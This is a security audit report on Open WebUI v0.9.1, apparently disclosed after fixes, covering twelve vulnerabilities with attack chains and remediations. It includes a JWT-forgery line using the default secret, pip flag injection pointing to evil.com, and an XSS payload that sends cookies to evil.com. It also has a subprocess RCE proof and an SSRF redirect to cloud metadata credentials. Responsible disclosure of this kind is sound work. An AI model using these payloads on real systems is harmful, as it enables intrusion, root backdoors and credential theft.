# Open WebUI Security Audit Report

**Date:** 2026-04-22 | **Auditor:** AutoFyn Security | **Version tested:** v0.9.1 (main, post-f162d4de)

> **Responsible disclosure.** These findings are fixed in **Open WebUI v0.9.5**. They were disclosed privately and patched before publication, and this report was released only after the fix had been public for over two weeks. Upgrade to v0.9.5 or later. No live, unpatched vulnerabilities are disclosed here.

---

## Executive Summary

12 vulnerabilities found — 4 Critical, 5 High, 3 Medium. Live-confirmed against a Docker deployment. The worst-case scenario: on an affected deployment that still exposes a bootstrap path or leaks the admin UUID, an external attacker reaches persistent root RCE inside the container and steals all API keys and user data. Findings span authentication, authorization, input validation, and frontend rendering.

**Key caveats:** Attack Chains 1 and 2 require the JWT secret to be the publicly known default `t0p-s3cr3t`. Default Docker and `open-webui serve` generate a random secret. The default is active when running `open-webui dev`, `backend/dev.sh`, or bare `uvicorn open_webui.main:app` without setting `WEBUI_SECRET_KEY`. Also, current startup disables public signup after the first user, so a pure unauthenticated entry path is not present on a normally initialized deployment unless signup is re-enabled or the attacker already knows the admin UUID. Findings 6, 7, 8, 9, 11 affect **all** deployments regardless of secret.

---

## Attack Chains

### Chain 1: Low-Privilege or Known-UUID → Root RCE + Persistent Backdoor (F1 + F10) — CVSS 9.8

**Requires:** Target uses default secret (`open-webui dev`, bare uvicorn, or explicit `t0p-s3cr3t`) and attacker either has a low-privilege account or already knows the admin UUID. A zero-credential start additionally requires signup to still be enabled.

1. If signup is still enabled, create an account and leak admin email via `/auths/admin/details` (accessible even to pending users)
2. Obtain admin UUID: if `DEFAULT_USER_ROLE=user`, use `/users/search` directly. If `pending` (default) or signup is already closed, UUID must be obtained via other means (leaked in shared chat URLs, API responses, browser history, or operator-provided value)
3. Forge admin JWT: `jwt.encode({'id': admin_id}, 't0p-s3cr3t', 'HS256')`
4. Create tool with `requirements: setuptools, --extra-index-url, https://evil.com/simple/, --trusted-host, evil.com, setuptools`
5. pip fetches from attacker index → `setup.py` runs as root inside container
6. On every restart, `install_tool_and_function_dependencies()` reinstalls the payload — **persistent backdoor**

**Live-confirmed:** After the initial admin existed, public signup returned `403` because `signup_handler()` sets `ENABLE_SIGNUP=False` on first-user creation. Phase 1 was still live-confirmed on an affected deployment using a provided admin UUID. Steps 4-5 were live-confirmed: injected flags were passed to pip.

### Chain 2: Low-Privilege or Known-UUID → Immediate Root RCE (F1 + F12) — CVSS 9.1

**Requires:** Same as Chain 1

1. Obtain admin UUID and forge admin JWT (same as Chain 1 steps 1-3)
2. Create tool with module-level code: `import subprocess; subprocess.check_output(['id'])`
3. `exec()` at `plugin.py:231` fires immediately — code runs as root

**Live-confirmed:** Tool creation wrote `/tmp/rce_proof.txt` containing `uid=0(root)` and leaked `WEBUI_SECRET_KEY` from container env. Tested with an admin token directly; the F1-to-F12 chain remains valid on affected deployments when the attacker can supply or derive the admin UUID.

### Chain 3: Stored XSS → Persistent Account Takeover (F9 + F8 + F6 + F7) — CVSS 8.7

**Requires:** OAuth user views attacker's uploaded `.md` file. Affects **all** deployments.

1. Upload `.md` with mermaid block containing `<img src=x onerror=fetch('https://evil.com/?c='+document.cookie)>`
2. Victim opens file → `wrapper.innerHTML = svg` fires XSS (no DOMPurify in FilePreview)
3. OAuth cookie readable (`httponly=False`) → token exfiltrated
4. CORS reflects any origin → attacker reads API responses cross-origin
5. Victim logs out → token still valid (revocation is no-op without Redis, default 4-week expiry)

**Live-confirmed:** F6 (CORS reflection 4/4 origins) and F7 (token valid post-logout). F8 and F9 are code-confirmed; full OAuth/browser proof was not executed in this pass.

### Chain 4: Verified User → Cloud IAM Credential Theft (F11) — CVSS 8.5

**Requires:** Cloud-hosted deployment (AWS/GCP/Azure). Affects **all** deployments.

1. Attacker controls `https://public-server.com/redir` → responds `302 Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/`
2. `POST /api/v1/retrieval/process/web` with attacker URL → `validate_url()` passes (public IP)
3. `requests.get()` follows 302 to IMDS → IAM credentials returned

**Live-confirmed:** Direct IMDS URLs blocked by IP check. Redirect-following confirmed via code review (`allow_redirects=True` default vs `SafeWebBaseLoader` which correctly sets `False`).

---

## Findings

### F1: JWT Forgery via Hardcoded Default Secret — CRITICAL (CVSS 9.8)

**Code:** `env.py:564-567`, `auth.py:50`

`WEBUI_SECRET_KEY` falls back to `t0p-s3cr3t` when not set before module import. Any attacker who knows this value forges a JWT for any user.

**Vulnerable launch paths:**

| Launch method | Default secret active? |
|---|---|
| Docker / docker-compose (default) | No — `start.sh` generates random key |
| `open-webui serve` (pip CLI) | No — `__init__.py:35-42` generates random key |
| **`open-webui dev`** | **Yes** — no key generation |
| **`backend/dev.sh`** | **Yes** — runs uvicorn directly |
| **`uvicorn open_webui.main:app`** | **Yes** — env.py fallback kicks in |
| **Explicit `WEBUI_SECRET_KEY=t0p-s3cr3t`** | **Yes** |

**Live-confirmed:** On an affected deployment that explicitly used `WEBUI_SECRET_KEY=t0p-s3cr3t`, a forged admin JWT accessed `/openai/config` and `/api/v1/users/` with full admin privileges. The same forged token failed on stock Docker startup.

**Fix:** Remove the hardcoded fallback. Generate a random secret with `secrets.token_hex(32)` on first startup and persist to `data/.secret_key`. Raise an error if the key cannot be read or written.

---

### F10: Supply Chain RCE via Pip Flag Injection — CRITICAL (CVSS 9.1)

**Code:** `plugin.py:383-401`, `Dockerfile:23-24`

`install_frontmatter_requirements()` splits the `requirements` frontmatter field by comma and passes each token directly to `subprocess.check_call([python, -m, pip, install, ...])`. No validation rejects items starting with `-`. An attacker injects `--extra-index-url` and `--trusted-host` to redirect pip to a malicious index. `setup.py` runs as root (Dockerfile `UID=0`). Requirements are reinstalled on every restart via `install_tool_and_function_dependencies()` at `plugin.py:407`, creating a persistent backdoor.

**Live-confirmed:** Created tool with `requirements: setuptools, --extra-index-url, http://127.0.0.1:1/simple/, --trusted-host, 127.0.0.1, setuptools`. Injected flags stored verbatim and passed to pip.

**Fix:** Reject any requirement item starting with `-` before passing to subprocess. Run the container as non-root (`ARG UID=1000`). Add `--no-deps`.

---

### F12: RCE via Tool exec() — CRITICAL (CVSS 9.1)

**Code:** `plugin.py:231`, `tools.py:326-396`

`exec(content, module.__dict__)` runs all module-level Python in tool content immediately at creation time, without sandboxing. Requires admin role or `workspace.tools` permission on a **verified** user (pending users cannot create tools even with the permission granted). Dockerfile `UID=0` means exec runs as root.

**Live-confirmed:** Created tool with `import subprocess; open('/tmp/rce_proof.txt','w').write(subprocess.check_output(['id']).decode())`. Container file contained `uid=0(root)`. Also leaked `WEBUI_SECRET_KEY` via `os.environ`.

**Fix:** Sandbox `exec()` with RestrictedPython, nsjail, or Pyodide. Run container as non-root. Add audit logging for all tool create/update events. Warn admins that `workspace.tools` grants server-side code execution.

---

### F9: Stored XSS via Mermaid Diagram Rendering — CRITICAL (CVSS 8.7)

**Code:** `src/lib/utils/index.ts:1739`, `src/lib/components/chat/FileNav/FilePreview.svelte:140`

Mermaid initialized with `securityLevel: 'loose'` (allows HTML in node labels). `FilePreview.svelte:140` sets `wrapper.innerHTML = svg` without DOMPurify. The chat message path (`SVGPanZoom.svelte`) correctly uses `DOMPurify.sanitize()` — this is an inconsistency. Any verified user uploads a `.md` with a mermaid XSS payload; it fires for any user who opens the file. No default CSP configured.

**Live-confirmed:** Code-level only (upload requires verified role; static analysis confirmed the unsafe `innerHTML` path and `securityLevel: 'loose'`).

**Fix:** Change to `securityLevel: 'strict'`. Add `DOMPurify.sanitize(svg)` before `wrapper.innerHTML` in `FilePreview.svelte`. Enable a default Content-Security-Policy.

---

### F11: SSRF via RAG Web Fetch Redirect Following — HIGH (CVSS 8.5)

**Code:** `misc.py:61,65`, `retrieval/utils.py:182`

`is_string_allowed()` uses `str.endswith()` against the full URL string, not the parsed hostname. More critically, `requests.get(url, stream=True)` follows HTTP 302 redirects without re-validating the destination IP. An attacker-controlled public server redirects to cloud IMDS (`169.254.169.254`). `SafeWebBaseLoader._fetch()` in the same codebase correctly sets `allow_redirects=False` — inconsistency. Any verified user can call this endpoint.

**Live-confirmed:** Direct IMDS URLs correctly blocked by `validate_url()` IP check. Redirect-following was also live-confirmed with a public redirect (`https://httpbin.org/redirect-to?...`) that ultimately returned internal content from `http://127.0.0.1:8080/api/version`. The `endsWith()` hostname bug remains code-confirmed but secondary.

**Fix:** Set `allow_redirects=False` on `requests.get()` in `retrieval/utils.py:182`. Parse hostname with `urlparse().hostname` before blocklist checks.

---

### F6: CORS Wildcard Origin Reflection — HIGH (CVSS 8.1)

**Code:** `config.py:1756`, `main.py:1390-1396`

`CORS_ALLOW_ORIGIN` defaults to `'*'` with `allow_credentials=True`. Starlette reflects the request `Origin` header back as `Access-Control-Allow-Origin` with `Access-Control-Allow-Credentials: true`. Any site with a stolen token can make authenticated cross-origin API calls.

**Live-confirmed:** 4/4 origins reflected (`https://evil.example.com`, `https://attacker.com`, `null`, `http://localhost:9999`). Authenticated cross-origin request returned user data with HTTP 200.

**Fix:** Set `CORS_ALLOW_ORIGIN` to specific production hostnames. Never combine `allow_origins=['*']` with `allow_credentials=True`.

---

### F4: Post-Admin SSRF via Unvalidated Webhook URLs — HIGH (CVSS 8.1)

**Code:** `main.py:2337-2352`, `webhook.py:53-56`

`POST /api/webhook` accepts any string as the webhook URL with zero validation. Requires admin. The webhook fires on every signup/signin event, POSTing user data to the configured URL.

**Live-confirmed:** Set webhook to `http://169.254.169.254/latest/meta-data/` — accepted and saved. GET confirmed the stored URL.

**Fix:** Validate webhook URLs against private IP ranges (RFC 1918, 169.254.x.x, loopback) before accepting.

---

### F2: Post-Admin API Key Exposure — HIGH (CVSS 7.5)

**Code:** `openai.py:236-243`

`GET /openai/config` returns all OpenAI API keys in cleartext. Requires admin.

**Live-confirmed:** Retrieved full API key list via forged admin token.

**Fix:** Mask API keys in GET responses (last 4 characters only). Require re-authentication to reveal full values.

---

### F3: Post-Admin Database Export — HIGH (CVSS 7.5)

**Code:** `utils.py:105-123`, `config.py:1689`

`GET /api/v1/utils/db/download` streams the entire SQLite database. `ENABLE_ADMIN_EXPORT` defaults to `True`. Contains all users, bcrypt hashes, chat history, API keys.

**Live-confirmed:** Downloaded full 548KB database via forged admin token.

**Fix:** Default `ENABLE_ADMIN_EXPORT` to `False`. Add re-authentication before streaming.

---

### F7: Token Revocation No-Op Without Redis — MEDIUM (CVSS 5.3, AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N)

**Code:** `auth.py:229-276`, `auths.py:780-781`

`invalidate_token()` and `is_valid_token()` guard all revocation behind `if request.app.state.redis:`. Without Redis (default for all Docker/pip deployments), signout silently does nothing. Stolen tokens remain valid for the full JWT lifetime (`JWT_EXPIRES_IN` defaults to `4w`).

**Note:** This is a known design limitation. The JWT auto-expiry (`4w` default) provides a natural mitigation window, and exploitation requires the attacker to have already obtained a valid token through a separate vulnerability. The rating has been downgraded from HIGH to MEDIUM to reflect this reduced standalone impact.

**Live-confirmed:** Token remained valid after signout — HTTP 200 on authenticated endpoint post-logout.

**Fix:** Implement a database-backed revocation list as fallback when Redis is absent. Reduce default `JWT_EXPIRES_IN`.

---

### F8: OAuth Cookie Without HttpOnly — MEDIUM (CVSS 6.1)

**Code:** `oauth.py:1720-1727`

OAuth callback sets JWT cookie with `httponly=False`. Password login at `auths.py:127-134` correctly uses `httponly=True` — direct inconsistency. OAuth tokens are readable by `document.cookie`, enabling XSS-based theft.

**Live-confirmed:** Code-level + dynamic verification that password login correctly sets HttpOnly. OAuth path requires external IdP for full dynamic test.

**Fix:** Change `httponly=False` to `httponly=True` in `oauth.py:1723`.

---

### F5: User Enumeration via Search and Admin Details — MEDIUM (CVSS 5.3)

**Code:** `users.py:115-137`, `auths.py:922-947`

`GET /api/v1/users/search` returns full user objects (id, email, name, role) to any **verified** user (pending users get 401). `GET /api/v1/auths/admin/details` returns admin name and email to any authenticated user including pending — gated behind `SHOW_ADMIN_DETAILS` (defaults `True`). Together these enable admin ID discovery for F1 JWT forgery, but only when the attacker has verified status.

**Live-confirmed:** Pending user leaked admin email via `/admin/details`. Verified user searched admin ID, email, and role via `/users/search`.

**Fix:** Restrict `/users/search` to admin role or strip `id`/`email` from non-admin responses. Restrict `/admin/details` to verified users minimum. Consider defaulting `SHOW_ADMIN_DETAILS` to `False`.

---

## Deployment Impact Matrix

| Finding | Docker (default) | `open-webui dev` / bare uvicorn | Notes |
|---|---|---|---|
| F1 JWT Forgery | Safe (random key) | **Vulnerable** | Depends on launch path |
| F2–F4 Post-admin | Admin-only | Chainable via F1 | Requires admin by any means |
| F5 User Enum | **Vulnerable** | **Vulnerable** | Verified role for search, pending for admin details |
| F6 CORS | **Vulnerable** | **Vulnerable** | All deployments with default config |
| F7 Token Revocation | **Vulnerable** | **Vulnerable** | All deployments without Redis |
| F8 OAuth Cookie | **Vulnerable** | **Vulnerable** | OAuth users only |
| F9 Mermaid XSS | **Vulnerable** | **Vulnerable** | Requires verified role to upload |
| F10 Pip Injection | Admin-only | Chainable via F1 | Standalone requires admin |
| F11 SSRF RAG | **Vulnerable** | **Vulnerable** | Requires verified role |
| F12 Tool exec() | Admin-only | Chainable via F1 | Standalone requires admin or workspace.tools |

---

*Produced for authorized security testing purposes only.*
